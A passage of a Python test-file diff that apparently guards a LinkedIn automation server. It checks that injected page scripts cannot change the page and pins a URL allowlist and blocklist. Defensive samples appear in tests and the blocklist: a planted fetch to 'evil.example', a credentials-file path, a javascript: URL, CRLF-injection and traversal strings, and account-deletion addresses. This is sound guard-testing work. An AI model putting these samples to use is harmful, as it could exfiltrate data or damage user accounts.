+    # not a flag, it is two scripts sharing a body, and the one with the
+    # weaker rule is the one a future caller reaches for.
+    #
+    # ITS OWN RULE IS SUBTRACTION TWICE OVER. Past the first two pairs the
+    # label is withheld INSIDE THE PAGE and never crosses; the two that do
+    # cross are shaped, tallied and run through ``census_redact_rare`` in
+    # ``dom._search_appearance_labels``, which is where a count exists. The
+    # only other things it returns are ``<label>`` captions, the chart's own
+    # sentence, and COUNTS -- including the person-anchor count, which is the
+    # measurement the whole page was opened for and is an integer.
+    #
+    # EIGHTEEN AND NINETEEN, 2026-09-19, and they were nearly spent in the
+    # wrong place. ``anchors.read_anchor_classes`` and
+    # ``dom.read_collection_groupings`` run the two vocabulary-into-the-page
+    # scripts. Their first version ran ``evaluate`` inside
+    # ``linkedin_server/anchors.py`` and ``collections_page.py`` -- which this
+    # very test refused, correctly: page contact in two more modules is a
+    # narrow allowance becoming a habit. The scripts and their calls moved
+    # here; the readers kept the vocabulary, the closed alphabet and the
+    # tallying.
+    #
+    # WHAT THESE TWO BUY IS THE SAME THING INVITE_NEEDLE_JS BOUGHT -- a
+    # PRIVACY property rather than a reading. Both ship a vocabulary IN and
+    # return INTEGERS, so no page string crosses the boundary: not shaped, not
+    # redacted, not present. A locator chain could not do it, because the
+    # comparison has to happen where the strings are. For the anchor
+    # classifier that matters most: a raw href would carry ``/in/<slug>``, and
+    # a slug is a name.
+    assert waived_in.get("dom.py", 0) <= 19, waived_in
+
+
+# ---------------------------------------------------------------------------
+# 2. The injected JavaScript only reads
+# ---------------------------------------------------------------------------
+
+INJECTED_SCRIPTS = {
+    # 2026-09-02. The composer's dispatch modes, shaped IN THE PAGE. Declared
+    # here for the ordinary reason -- an executed script that is not declared
+    # is one nobody reviewed -- and it needs the scan for the usual reason and
+    # the privacy assertion for its own: it is the only script here that
+    # resolves an accessible name KNOWN to be the operator's own name, and the
+    # entire design is that the string is reduced to counts before it can
+    # leave. test_the_compose_script_returns_no_unshaped_label is the check
+    # that the reduction has no bypass.
+    "COMPOSE_MODES_JS": dom.COMPOSE_MODES_JS,
+    # 2026-09-02, and it is the SECOND script on the composer and the one with
+    # the sharper privacy argument. COMPOSE_MODES_JS resolves a name known to
+    # be HIS; this one runs where a committed recipient is by definition a
+    # THIRD PARTY, so any label it touches names somebody who is not him.
+    #
+    # It is declared for the ordinary reason -- an executed script that is not
+    # declared is one nobody reviewed -- and its own rule is that it returns
+    # INTEGERS ONLY: a per-selector count, a de-duplicated total, and how many
+    # carry the needle the caller handed in. The needle comparison happens
+    # inside the page for the reason INVITE_NEEDLE_JS does the same, and there
+    # is deliberately no `revealSingleMatch` escape hatch: that flag exists so
+    # a PREVIEW can show him who he would reach, and this script runs inside
+    # perform, after he has confirmed, where there is nothing left to show.
+    "SELECTED_RECIPIENT_JS": dom.SELECTED_RECIPIENT_JS,
+    "RECIPIENT_IDS_JS": dom.RECIPIENT_IDS_JS,
+    "HARVEST_LINKED_CARDS_JS": dom.HARVEST_LINKED_CARDS_JS,
+    "HARVEST_BLOCK_CARDS_JS": dom.HARVEST_BLOCK_CARDS_JS,
+    "READ_PROFILE_JS": dom.READ_PROFILE_JS,
+    # 2026-08-26. The surface census reads the CONTROLS on a page rather than
+    # its content, which means it is the one script here that goes looking at
+    # buttons -- so it is the one whose scan matters most, and it is scanned by
+    # exactly the same check as the other three rather than by a special case.
+    "CENSUS_JS": dom.CENSUS_JS,
+    # 2026-09-19. The two vocabulary-into-the-page scripts. Declared for the
+    # ordinary reason -- an executed script that is not declared is one nobody
+    # reviewed -- and declaring them ENROLS them in
+    # test_every_script_this_package_executes_cannot_mutate.
+    #
+    # THEY ARE THE FIRST SCRIPTS HERE WHOSE VOCABULARY IS AN ARGUMENT rather
+    # than a constant. The caller ships terms defined in its own module and the
+    # page answers with a POSITION IN THAT LIST, so the output alphabet is
+    # closed by construction and no page string crosses the boundary. The
+    # anchor one is the load-bearing case: a raw href would carry ``/in/<slug>``
+    # and a slug is a name.
+    #
+    # Both parse their CONTROL input with ``DOMParser`` rather than assigning
+    # markup to a detached node. That is not a style choice -- the scanner
+    # refuses the assignment, rightly, because it cannot tell a detached node
+    # from an attached one and one future edit appending the container would
+    # turn the same line into a real mutation.
+    "ANCHOR_CLASSIFY_JS": dom.ANCHOR_CLASSIFY_JS,
+    "COLLECTION_GROUPINGS_JS": dom.COLLECTION_GROUPINGS_JS,
+    # 2026-08-30. The row-shape reader, which climbs from a job-row anchor and
+    # reports each level as a tag name and two character counts. It exists
+    # purely to describe a page this package could not read, and it is held to
+    # the same scan as the rest. It also carries the strictest privacy rule in
+    # the module: no text and no attribute value leaves it, because a tracker
+    # row names a company and a job.
+    "TRACKER_ROW_SHAPE_JS": dom.TRACKER_ROW_SHAPE_JS,
+    # 2026-09-01. The SDUI action counter. Declared here for the ordinary
+    # reason -- an executed script that is not declared is one nobody reviewed
+    # -- and it needs the scan more than most, because it is the only script
+    # in this module that reads the FLIGHT PAYLOAD rather than the DOM. That
+    # payload is ~1.09 MB of his profile, so the script returns integers and a
+    # hit count and nothing else; there is no path by which a payload string
+    # reaches this process.
+    "SDUI_ACTIONS_JS": dom.SDUI_ACTIONS_JS,
+    # 2026-08-31. The invitation needle. It is declared here for the ordinary
+    # reason -- every script this package executes is scanned, and one that is
+    # not declared is one nobody reviewed -- and declaring it ENROLS it in
+    # test_every_script_this_package_executes_cannot_mutate, which is the
+    # point of the list rather than a side effect of joining it.
+    #
+    # It is also the only script here whose OUTPUT shape is part of the
+    # boundary rather than only its input. It reads aria-labels carrying real
+    # people's names and returns three integers, so the privacy property is
+    # structural: there is no string in the return value to leak. The test that
+    # certifies THAT lives with the reader, not here.
+    "INVITE_NEEDLE_JS": dom.INVITE_NEEDLE_JS,
+    # 2026-08-31. The self-owned editor reader. Declared for the ordinary
+    # reason -- an undeclared script is one nobody reviewed -- and declaring it
+    # ENROLS it in test_every_script_this_package_executes_cannot_mutate.
+    #
+    # It is the one script here whose OUTPUT is deliberately LESS shaped than
+    # the census's: it publishes accessible names ungated, on the operator's
+    # 2026-08-31 ruling that a container measured to be his own holds no third
+    # party. That makes the mutation scan more load-bearing rather than less --
+    # a script that both reads labels and could touch the page would be the
+    # worst combination available here -- and it is why the scan is asserted a
+    # second time in tests/test_editor_fields.py rather than only from this
+    # list.
+    "EDITOR_FIELDS_JS": dom.EDITOR_FIELDS_JS,
+    # 2026-09-01. The self-owned editor VALUE reader. Declared for the ordinary
+    # reason -- an undeclared script is one nobody reviewed -- and declaring it
+    # ENROLS it in test_every_script_this_package_executes_cannot_mutate.
+    #
+    # IT IS THE WIDEST-PUBLISHING SCRIPT ON THIS LIST. EDITOR_FIELDS_JS gave
+    # up the census's <opaque> gate on NAMES; this one returns what the
+    # controls HOLD, unshaped and unsubstituted, because a substituted value
+    # is not a string he could restore. That makes the mutation scan more
+    # load-bearing than anywhere else here: a script that reads a man's
+    # profile verbatim AND could touch the page is the worst combination
+    # available in this package.
+    #
+    # ITS PRIVACY WORK IS STRUCTURAL and happens in the page: file inputs,
+    # password inputs, and the value attribute of checkboxes and radios never
+    # cross into this process at all. Asserted a second time in
+    # tests/test_editor_values.py rather than only from this list.
+    "EDITOR_VALUES_JS": dom.EDITOR_VALUES_JS,
+    # 2026-08-31. The own-activity item reader. Declared for the ordinary
+    # reason -- an undeclared script is one nobody reviewed -- and declaring
+    # it ENROLS it in test_every_script_this_package_executes_cannot_mutate.
+    #
+    # It is the ninth, and it is the FIRST script here that publishes a REAL
+    # IDENTIFIER: item urns, unshaped, because a substituted urn is <urn> and
+    # that is the useless answer the reader exists to replace. Everything
+    # else it returns is an integer or a boolean, and the author strings it
+    # compares never leave the document -- so its privacy property, like
+    # INVITE_NEEDLE_JS's, is structural rather than a matter of shaping on
+    # the way out. The gate that decides whether the urn list crosses at all
+    # lives INSIDE this script, which is why the scan matters here: a script
+    # that both holds a privacy gate and could touch the page would be the
+    # worst combination available. Asserted a second time in
+    # tests/test_activity_items.py.
+    "ACTIVITY_ITEMS_JS": dom.ACTIVITY_ITEMS_JS,
+    # 2026-09-03. The job posting's insight markers. Declared for the ordinary
+    # reason -- an undeclared script is one nobody reviewed -- and declaring
+    # it ENROLS it in test_every_script_this_package_executes_cannot_mutate.
+    #
+    # IT IS THE LEAST-PUBLISHING SCRIPT ON THIS LIST, which is a fact about
+    # its design rather than luck. It runs on a JOB POSTING, and a posting
+    # draws a hiring team and a "people also viewed" rail, so its DOM is full
+    # of third parties. What it returns is: the data-view-name attribute
+    # values (this package's own vocabulary, written by LinkedIn as page
+    # structure and naming nobody), three booleans, and a character COUNT for
+    # main. No accessible name, no text, no href. The two furniture strings it
+    # tests for are compared INSIDE the page and only a boolean crosses.
+    "JOB_INSIGHT_MARKERS_JS": dom.JOB_INSIGHT_MARKERS_JS,
+    # 2026-09-03. The profile-views aggregates, and this one's privacy
+    # argument is the sharpest read-side argument in the list because of WHERE
+    # it runs. The Who's-Viewed-Me page IS a list of other members: its
+    # aria-labels say "Send a message to <a person>", "Invite <a person> to
+    # connect", "Follow <a person>".
+    #
+    # So the script is shaped by subtraction. It reads FOUR things: paragraph
+    # pairs where the first is a bare number, the <label> text inside a filter
+    # control, the chart's own one-sentence description, and COUNTS of
+    # data-view-name values. It reads NO aria-label at all and takes NO text
+    # from inside a viewer row -- those are counted and never opened.
+    #
+    # THAT SHAPE WAS CHOSEN BECAUSE THE ALTERNATIVE WAS MEASURED. A probe
+    # written the same day pointed dom.read_surface_census at this page,
+    # hand-rolled its own tally of the rows, and published thirteen real
+    # names -- because the singleton blanking that would have caught them runs
+    # at publish time in shape.census_aggregate, not in the reader. A script
+    # that only ever looks at numbers, <label> text and view names cannot make
+    # that mistake whatever a future caller does with it.
+    "PROFILE_VIEWS_INSIGHTS_JS": dom.PROFILE_VIEWS_INSIGHTS_JS,
+    # 2026-09-05. His own search-appearances page -- the reciprocal instrument
+    # for a SEARCH, standing to people search where the entry above stands to
+    # a profile load.
+    #
+    # IT RUNS WHERE THE SIXTEENTH'S ARGUMENT IS TRUE AND ONE STEP WORSE. That
+    # page is a list of other members; this one is expected to be a list of
+    # other members PLUS aggregate panels about them, drawn in the exact shape
+    # the paragraph-pair rule matches. So this script's rule is subtraction
+    # applied twice: past the first two pairs the label is WITHHELD INSIDE THE
+    # PAGE, and the two that cross are shaped, tallied and redacted in
+    # ``dom._search_appearance_labels`` -- at aggregation time, where a count
+    # exists, because ``census_shape`` is a length-and-charset gate and not the
+    # redactor.
+    #
+    # ITS ONE POSITIVE PUBLICATION IS AN INTEGER. ``person_anchors`` counts
+    # hrefs matched inside the page and is the whole answer to whether this
+    # surface names the people who searched -- the question a ruling on people
+    # search turns on. The href itself never crosses.
+    #
+    # THE HONEST LIMIT, recorded here because a declaration is where a reader
+    # will look: this script has never run on the real page. It is proven
+    # against a SYNTHETIC fixture that says so in its own first line, and the
+    # scan below certifies that it cannot mutate, not that it can read.
+    "SEARCH_APPEARANCES_JS": dom.SEARCH_APPEARANCES_JS,
+}
+
+
+def evaluate_targets(source: str) -> list[tuple[str, str, int]]:
+    """Return what every ``.evaluate(...)`` in ``source`` is handed, by AST.
+
+    Each entry is ``(kind, value, lineno)`` where kind is ``"name"`` (a
+    module-level constant, value is its identifier) or ``"inline"`` (a literal
+    string, value is the string itself). An argument that is neither -- an
+    f-string, a concatenation, a function call, a variable built at runtime --
+    comes back as ``"unresolvable"``, because a script this check cannot read
+    is a script it cannot certify.
+    """
+    out: list[tuple[str, str, int]] = []
+    for node in ast.walk(ast.parse(source)):
+        if not isinstance(node, ast.Call):
+            continue
+        func = node.func
+        if not (isinstance(func, ast.Attribute) and func.attr.startswith("evaluate")):
+            continue
+        if not node.args:
+            out.append(("unresolvable", "<no argument>", node.lineno))
+            continue
+        first = node.args[0]
+        if isinstance(first, ast.Name):
+            out.append(("name", first.id, first.lineno))
+        elif isinstance(first, ast.Constant) and isinstance(first.value, str):
+            out.append(("inline", first.value, first.lineno))
+        else:
+            out.append(("unresolvable", type(first).__name__, first.lineno))
+    return out
+
+
+def _scripts_this_package_executes() -> dict[str, str]:
+    """The scripts actually reaching ``evaluate``, resolved from the call sites."""
+    import importlib
+
+    executed: dict[str, str] = {}
+    for module in MODULES:
+        targets = evaluate_targets(module.read_text(encoding="utf-8"))
+        if not targets:
+            continue
+        imported = importlib.import_module(f"linkedin_server.{module.stem}")
+        for kind, value, lineno in targets:
+            label = f"{module.stem}:{lineno}"
+            if kind == "inline":
+                executed[label] = value
+                continue
+            if kind == "unresolvable":
+                raise AssertionError(
+                    f"{module.name}:{lineno} passes {value} to evaluate(). This "
+                    "check can only certify a script it can read, so an "
+                    "injected script must be a module-level constant or a "
+                    "literal."
+                )
+            script = getattr(imported, value, None)
+            assert isinstance(script, str), (
+                f"{module.name}:{lineno} passes {value} to evaluate() and it is "
+                f"not a module-level string ({type(script).__name__})."
+            )
+            executed[f"{label} {value}"] = script
+    return executed
+
+
+#: Resolved from the CALL SITES, not from a naming convention. See below.
+EXECUTED_SCRIPTS = _scripts_this_package_executes()
+
+
+@pytest.mark.parametrize("name", sorted(EXECUTED_SCRIPTS))
+def test_every_script_this_package_executes_cannot_mutate(name: str):
+    """The scan, bound to what RUNS rather than to what is named a certain way.
+
+    The previous version of this check scanned a hand-written dict of three
+    names, guarded by a second check that enumerated ``dir(dom)`` for names
+    ending in ``_JS``. Both sets happened to coincide, and nothing anywhere
+    looked at the first argument of an ``evaluate`` call -- so a script named
+    without the suffix could be injected and no test would ever read it. A cold
+    review demonstrated exactly that: a constant called ``EVIL_INLINE``,
+    carrying ``localStorage.setItem`` and ``fetch(``, passed at the existing
+    call site, shipped with the whole suite green.
+    """
+    found = readonly.scan_js_for_mutations(EXECUTED_SCRIPTS[name])
+    assert found == [], f"{name} contains mutating tokens: {found}"
+
+
+def test_the_scripts_executed_are_exactly_the_ones_declared():
+    """No script runs that this module does not know the name of.
+
+    TWO COUNTS, AND THEY ARE DIFFERENT QUESTIONS. The NAMES must match the
+    declaration exactly -- an undeclared script is the thing this file exists
+    to catch. The number of CALL SITES is pinned separately, and it is allowed
+    to exceed the number of scripts: one script may legitimately run from more
+    than one place.
+
+    SIX FROM 2026-08-30, up from four, and both additions are one script run a
+    second time rather than new surface area. ``dom.harvest_census`` runs
+    ``HARVEST_LINKED_CARDS_JS`` -- the SAME script the harvest runs, under a
+    flag, precisely so a diagnostic cannot drift from the walk it describes --
+    and ``dom.read_tracker_row_shape`` runs ``TRACKER_ROW_SHAPE_JS``.
+
+    SEVEN FROM 2026-08-31, and unlike the two before it this one IS new
+    surface area: ``INVITE_NEEDLE_JS``, run once from
+    ``dom.read_invitation_surface``. The argument for spending an evaluate
+    waiver on it is with the budget in
+    ``test_only_dom_module_waives_evaluate`` -- in short, it is the only
+    script here that exists to keep a value OUT of this process rather than to
+    bring one in.
+
+    EIGHT FROM 2026-08-31, new surface area again: ``EDITOR_FIELDS_JS``, run
+    once from ``dom.read_self_owned_editor_fields``. It is the mirror of the
+    seventh -- that one keeps an identity out of this process, this one lets
+    accessible names in, ungated, from inside a container measured to be the
+    operator's own. Its waiver argument is with the budget in
+    ``test_only_dom_module_waives_evaluate``.
+
+    NINE FROM 2026-08-31, new surface area again: ``ACTIVITY_ITEMS_JS``, run
+    once from ``dom.read_own_activity_items``. It is the third of these three
+    that exists for a privacy reason rather than a reading reason, and it is
+    the only one that does BOTH halves at once -- it keeps two name strings out
+    of this process AND publishes a real identifier, and which of those two it
+    does is decided by a gate inside the script itself.
+
+    ELEVEN FROM 2026-09-01, new surface area, and the count skips a paragraph:
+    the TENTH was ``SDUI_ACTIONS_JS`` and its argument is with the budget
+    rather than here. The eleventh is ``EDITOR_VALUES_JS``, run once from
+    ``dom.read_self_owned_editor_values``. It is the widest-publishing script
+    on the list -- the eighth gave up the census's gate on NAMES, this one
+    returns what the controls HOLD, verbatim -- and a second script rather
+    than a flag on the eighth precisely so that the eighth's "no value read"
+    assertion stays unconditional.
+
+    TWELVE FROM 2026-09-02: ``COMPOSE_MODES_JS``, run once from
+    ``dom.read_compose_modes``. It is the NARROWEST-publishing script on the
+    list and the exact opposite of the eleventh -- it resolves a label it is
+    forbidden to return, and hands back only how many capitalised runs the
+    label carried, whether they were joined by "to", and the tail that
+    survives the last one. It is a second script rather than a flag on the
+    eighth for the same reason the eleventh was, plus one the eleventh did not
+    have: the eighth cannot REACH these controls at all, because they have no
+    container ancestor to be scoped to. The argument is with the budget in
+    ``test_only_dom_module_waives_evaluate``.
+
+    THIRTEEN FROM 2026-09-03: ``RECIPIENT_IDS_JS``, run once from
+    ``dom.read_recipient_ids``. It climbs from a Message button to the row
+    that holds it and reads the member id already drawn there -- a value on a
+    page ``linkedin_who_viewed_me`` ALREADY OPENS, which the person-anchored
+    harvest beside it discards. It publishes nothing: the ids go to a caller
+    as data and the function has no logging line at all, asserted on its
+    source in ``tests/test_recipient_ids_from_the_viewer_list.py``.
+
+    FOURTEEN AND FIFTEEN FROM 2026-09-03: ``JOB_INSIGHT_MARKERS_JS``, run once
+    from ``dom.read_job_insight_panels``, and ``PROFILE_VIEWS_INSIGHTS_JS``,
+    run once from ``dom.read_profile_views_insights``. Both are new surface
+    area rather than a second call site, and both read a page a tool has
+    ALREADY loaded -- the posting ``linkedin_job_detail`` opens for its
+    description, and the analytics page ``linkedin_who_viewed_me`` opens for
+    its rows. Neither navigates and neither clicks.
+
+    ONLY ONE WAIVER IS SPENT ON THE POSTING, and the reason belongs here
+    rather than in the budget: ``read_job_insight_panels`` gets its headings
+    from ``READ_PROFILE_JS``, the script that already exists, and injects its
+    own only for the questions a heading walk cannot answer -- an
+    ``aria-label``, two substring tests kept inside the page, and a character
+    count. The profile-views page gets no such reuse because it has NO h1, h2
+    or h3 at all, so the heading walker returns nothing of it.
+    """
+    names = {label.split()[-1] for label in EXECUTED_SCRIPTS if " " in label}
+    assert names == set(INJECTED_SCRIPTS), names
+    # EIGHTEEN AND NINETEEN, 2026-09-19: ANCHOR_CLASSIFY_JS and
+    # COLLECTION_GROUPINGS_JS. They are the first scripts here whose
+    # VOCABULARY IS AN ARGUMENT rather than a constant -- the caller ships
+    # terms defined in its own module and the page answers with a POSITION in
+    # that list, so the output alphabet is closed by construction and no page
+    # string crosses the boundary. Both parse their CONTROL input with
+    # DOMParser rather than assigning markup to a detached node, because the
+    # scanner refuses that assignment and is right to: it cannot tell a
+    # detached node from an attached one.
+    assert len(EXECUTED_SCRIPTS) == 19, sorted(EXECUTED_SCRIPTS)
+
+
+def test_the_call_site_resolver_sees_a_script_hiding_behind_a_name():
+    """The control, and the exact attack the cold review used.
+
+    ``EVIL_INLINE`` does not end in ``_JS``, so the old convention-based check
+    was blind to it. The resolver reports it because it reads the call.
+    """
+    planted = (
+        "EVIL_INLINE = \"() => { fetch('https://evil.example/x'); }\"\n"
+        "async def read(page):\n"
+        "    return await page.evaluate(EVIL_INLINE, cfg)  # readonly-ok\n"
+    )
+    assert evaluate_targets(planted) == [("name", "EVIL_INLINE", 3)]
+
+
+def test_the_call_site_resolver_refuses_a_script_it_cannot_read():
+    """A script assembled at runtime cannot be certified, so it is rejected."""
+    planted = (
+        "async def read(page):\n"
+        "    return await page.evaluate(BASE + tail())  # readonly-ok\n"
+    )
+    kinds = {kind for kind, _, _ in evaluate_targets(planted)}
+    assert kinds == {"unresolvable"}, evaluate_targets(planted)
+
+
+def test_the_js_scanner_catches_a_planted_mutation():
+    """The JS scanner, shown failing."""
+    bad = """
+    () => {
+      document.querySelector('#apply').click();
+      document.querySelector('#note').value = 'hi';
+      fetch('/voyager/api/whatever', {method: 'POST'});
+    }
+    """
+    found = readonly.scan_js_for_mutations(bad)
+    assert ".click(" in found and ".value =" in found and "fetch(" in found, found
+
+
+def test_every_injected_script_is_scanned():
+    """Catches a fourth script being added to dom.py without a scan."""
+    declared = {
+        name
+        for name in dir(dom)
+        if name.endswith("_JS") and isinstance(getattr(dom, name), str)
+    }
+    assert declared == set(INJECTED_SCRIPTS), declared
+
+
+# ---------------------------------------------------------------------------
+# 3. The navigation allowlist
+# ---------------------------------------------------------------------------
+
+ALLOWED = [
+    "https://www.linkedin.com/analytics/profile-views/",
+    "https://www.linkedin.com/me/profile-views/",
+    "https://www.linkedin.com/jobs-tracker/?stage=saved",
+    "https://www.linkedin.com/jobs-tracker/?stage=applied",
+    # THE THIRD STAGE, allowed 2026-08-26. The tab LinkedIn labels "In
+    # Progress" is addressed as ``?stage=draft`` -- the token read off
+    # LinkedIn's own anchors in the tracked fixture jobs_tracker_row.html,
+    # not guessed from the label, which is a different word.
+    "https://www.linkedin.com/jobs-tracker/?stage=draft",
+    "https://www.linkedin.com/jobs/search/?keywords=node&f_WT=2",
+    "https://www.linkedin.com/in/me/",
+    # THE `/in/me/` FORM, CORRECTED 2026-09-04 WHEN THE BOUNDARY NARROWED.
+    # This read `/in/<a-slug>/details/skills/` and was STALE: the server
+    # stopped building that form on 2026-09-03, when
+    # `test_navigation_is_never_derived` found the aim was parsed out of a
+    # landed url and `linkedin_my_profile` was moved onto
+    # `PROFILE_DETAIL_URLS`, a table of `/in/me/` literals. The allowlist
+    # kept admitting the old shape for a day longer than anything built it.
+    "https://www.linkedin.com/in/me/details/skills/",
+    "https://www.linkedin.com/notifications/",
+    "https://www.linkedin.com/feed/",
+    "https://www.linkedin.com/login",
+    # One job posting, addressed by its numeric id and nothing else.
+    "https://www.linkedin.com/jobs/view/4600000042",
+    "https://www.linkedin.com/jobs/view/4600000042/",
+    # HIS OWN MESSAGE SURFACE, allowed 2026-08-26 on the operator's ruling.
+    # Both forms, because asking for the first LANDS on the second: LinkedIn
+    # redirects /messaging/ into a conversation it chooses, measured twice.
+    "https://www.linkedin.com/messaging/",
+    "https://www.linkedin.com/messaging/thread/2-abc/",
+    # THE TWO ADDRESSES THE OPERATOR RULED ON 2026-08-31, and each is ONE url
+    # rather than a family. The intro editor on HIS OWN profile, in the
+    # ``/in/me/`` spelling only -- that spelling redirects to whoever is signed
+    # in, so it can only ever reach him -- and ONE NAMED settings page. The
+    # rest of both families is in BLOCKED below, which is where the narrowness
+    # of this pair is actually asserted.
+    "https://www.linkedin.com/in/me/edit/intro/",
+    "https://www.linkedin.com/mypreferences/d/dark-mode",
+    # THE FOUR THE OPERATOR RULED ON 2026-08-31, each named individually and
+    # never as a family. The narrowness of every one of them is asserted in
+    # BLOCKED below, which is the half of this pair that does the work: an
+    # ALLOWED entry says a url opens, and only the refused neighbours say the
+    # permission stopped where it was supposed to.
+    #
+    # ONE ITEM PERMALINK, in both spellings LinkedIn serves. The urn shape is
+    # the anchored one dom.ACTIVITY_ITEMS_JS already requires before it will
+    # emit a key, so the only urns this server can build are the only ones the
+    # pattern admits.
+    "https://www.linkedin.com/feed/update/urn:li:activity:7400000000000000001/",
+    "https://www.linkedin.com/feed/update/urn:li:activity:7400000000000000001",
+    # THE TWO PUBLISHING COMPOSERS. Both were measured as real anchors -- an
+    # <a> with an href, count 1 each -- before either was written down.
+    "https://www.linkedin.com/preload/sharebox/",
+    "https://www.linkedin.com/article/new/",
+    # THE MESSAGE COMPOSER, and this one url ONLY. It is bought past
+    # ``/messaging/compose`` by an EXACT-url exemption, so the trailing-slash
+    # spelling opens and nothing else in that family does -- see BLOCKED.
+    "https://www.linkedin.com/messaging/compose/",
+    # HIS OWN SUBSCRIPTION PAGE, 2026-09-01. One named address, admitted to
+    # answer one question -- whether an InMail balance is countable -- and
+    # its neighbours are in BLOCKED below, which is where the narrowness is
+    # actually asserted. /premium/ carries purchase and upgrade flows.
+    "https://www.linkedin.com/premium/my-premium/",
+    # HIS OWN GROUPS AND HIS OWN EVENTS, THE ROOTS ONLY, 2026-09-05. Both
+    # spellings, because both anchored patterns end ``/?$`` and the slashless
+    # form therefore matches -- listing only the slashed one would leave half
+    # the permission unasserted. Everything under either root is in BLOCKED
+    # below, and that half is the one doing the work here: the member roster
+    # and the attendee list are what these two entries had to NOT admit.
+    "https://www.linkedin.com/groups/",
+    "https://www.linkedin.com/groups",
+    "https://www.linkedin.com/events/",
+    "https://www.linkedin.com/events",
+]
+
+BLOCKED = [
+    # Actions on LinkedIn.
+    "https://www.linkedin.com/jobs/application/12345",
+    # SENDING. The messaging READ surface left this list on 2026-08-26 when
+    # the operator ruled that reading his own inbox is his to do; the composer
+    # did not, and it is the entry that keeps sending impossible. It is the
+    # pre-filled compose overlay LinkedIn opens from a job page.
+    "https://www.linkedin.com/messaging/compose/?body=hello&interop=msgOverlay",
+    # THE COMPOSER'S NEIGHBOURS, added 2026-08-31 in the same commit that
+    # admitted ONE composer url. They are the whole of the evidence that the
+    # exemption is an EQUALITY rather than a prefix: the pre-filled overlay
+    # above still refuses, and so do these.
+    "https://www.linkedin.com/messaging/compose/?recipient=someone",
+    "https://www.linkedin.com/messaging/compose/new/",
+    # AND THE ITEM PERMALINK'S NEIGHBOURS. ``/feed/update`` left the forbidden
+    # tuple to buy the permalink, so these are what proves the family's
+    # DANGEROUS half is still refused -- by ``/edit/``, ``/delete``,
+    # ``action=`` and the anchored pattern respectively.
+    "https://www.linkedin.com/feed/update/urn:li:activity:7400000000000000001/edit/",
+    "https://www.linkedin.com/feed/update/urn:li:activity:7400000000000000001/delete",
+    "https://www.linkedin.com/feed/update/urn:li:activity:7400000000000000001/?action=delete",
+    "https://www.linkedin.com/feed/update/",
+    "https://www.linkedin.com/feed/update/urn%3Ali%3Aactivity%3A7400000000000000001/",
+    # And the two composers' neighbours, for the same reason.
+    "https://www.linkedin.com/preload/sharebox/publish",
+    # THE SUBSCRIPTION PAGE'S NEIGHBOURS. /premium/ has purchase and upgrade
+    # flows under it and this admission is ONE page: the family root, a
+    # sub-path, and a query string all refuse.
+    "https://www.linkedin.com/premium/",
+    "https://www.linkedin.com/premium/my-premium/upgrade",
+    "https://www.linkedin.com/premium/products/",
+    "https://www.linkedin.com/article/edit/7400000000000000001/",
+    "https://www.linkedin.com/mynetwork/invitation-manager/",
+    "https://www.linkedin.com/in/someone/edit/topcard/",
+    "https://www.linkedin.com/psettings/open-to-work",
+    "https://www.linkedin.com/voyager/api/relationships/invitations",
+    "https://www.linkedin.com/notifications/?action=markAllRead",
+    # Other people's data at scale, and other hosts entirely.
+    "https://www.linkedin.com/search/results/people/?keywords=cto",
+    "https://www.linkedin.com/company/acme/people/",
+    "https://evil.example.com/steal",
+    "http://www.linkedin.com/feed/",
+    "javascript:alert(1)",
+    "file:///C:/Users/<user>/.claude/.credentials.json",
+    "",
+    # The job tracker, which the allowlist admits at exactly three addresses.
+    # A wildcard query would have let every one of these through.
+    "https://www.linkedin.com/jobs-tracker/",
+    "https://www.linkedin.com/jobs-tracker/?stage=withdraw",
+    "https://www.linkedin.com/jobs-tracker/?stage=archived",
+    # The stages LinkedIn's own payload names and this server still refuses,
+    # listed since 2026-08-26 because that is the day the enumeration grew and
+    # a widening is only narrow if the things it did NOT admit are asserted.
+    "https://www.linkedin.com/jobs-tracker/?stage=interview",
+    "https://www.linkedin.com/jobs-tracker/?stage=clicked_apply",
+    "https://www.linkedin.com/jobs-tracker/?apply=1",
+    "https://www.linkedin.com/jobs-tracker/?stage=saved&save=1",
+    "https://www.linkedin.com/jobs-tracker/?a%63tion=delete",
+    "https://www.linkedin.com/jobs-tracker/?stage=saved#/../messaging/",
+    "https://www.linkedin.com.evil.example/jobs-tracker/?stage=saved",
+    # The address the tracker replaced. Nothing builds it any more, so it is
+    # off the list -- a pattern kept for a url the server never opens is a
+    # door with nobody watching it.
+    "https://www.linkedin.com/my-items/saved-jobs/?cardType=SAVED",
+    # A job posting, at every address this server does NOT build. The tool
+    # takes an integer and formats it, so the numeric form is the only one
+    # that can ever be produced -- and the pattern permits only that. A slug
+    # carries a job title, which is a string, which is the thing an allowlist
+    # exists to keep out of a url.
+    "https://www.linkedin.com/jobs/view/senior-node-engineer-at-acme-4600000042/",
+    "https://www.linkedin.com/jobs/view/4600000042/?refId=abc",
+    "https://www.linkedin.com/jobs/view/4600000042/applying",
+    "https://www.linkedin.com/jobs/view/12345",
+    "https://www.linkedin.com/jobs/view/",
+    "https://www.linkedin.com/jobs/view/abc/",
+    # Whitespace, which every anchored pattern would otherwise swallow: "$"
+    # matches before a trailing newline and "[^#]*" matches a CRLF.
+    "https://www.linkedin.com/feed/\n",
+    "https://www.linkedin.com/jobs-tracker/?stage=saved\n",
+    "https://www.linkedin.com/notifications/?x=1\r\nX: y",
+    " https://www.linkedin.com/feed/",
+    # THE TWO MOST DESTRUCTIVE ADDRESSES ON THE ACCOUNT. Measured off a live
+    # census 2026-08-31: LinkedIn's own settings index links to "Close and
+    # delete account" at ``/mypreferences/d/close-accounts`` and to "Hibernate
+    # account" at ``/mypreferences/d/hibernate-account``. NEITHER contains
+    # ``categories/``, so until that day the only thing refusing them was the
+    # anchored allowlist -- for a list that documents itself as a second,
+    # independent gate, the two worst addresses had no second gate at all.
+    # Which gate refuses them now is asserted in
+    # ``test_the_two_account_destroying_addresses_are_refused_by_the_denylist``;
+    # here they are simply refused.
+    "https://www.linkedin.com/mypreferences/d/close-accounts",
+    "https://www.linkedin.com/mypreferences/d/hibernate-account",
+    # THE REST OF THE /edit/ FAMILY, which is the whole family bar one url.
+    # ``/in/me/edit/intro/`` is exempted from the ``/edit/`` substring by
+    # NAME and by EXACT MATCH; nothing else in the family is, and a prefix is
+    # not a match.
+    "https://www.linkedin.com/in/me/edit/",
+    "https://www.linkedin.com/in/me/edit/topcard/",
+    "https://www.linkedin.com/in/me/edit/forms/next-action/",
+    "https://www.linkedin.com/in/me/edit/intro/../../evil",
+    "https://www.linkedin.com/in/me/edit/intro/?action=delete",
+    # ANOTHER MEMBER'S INTRO EDITOR, and the reason no member-slug pattern was
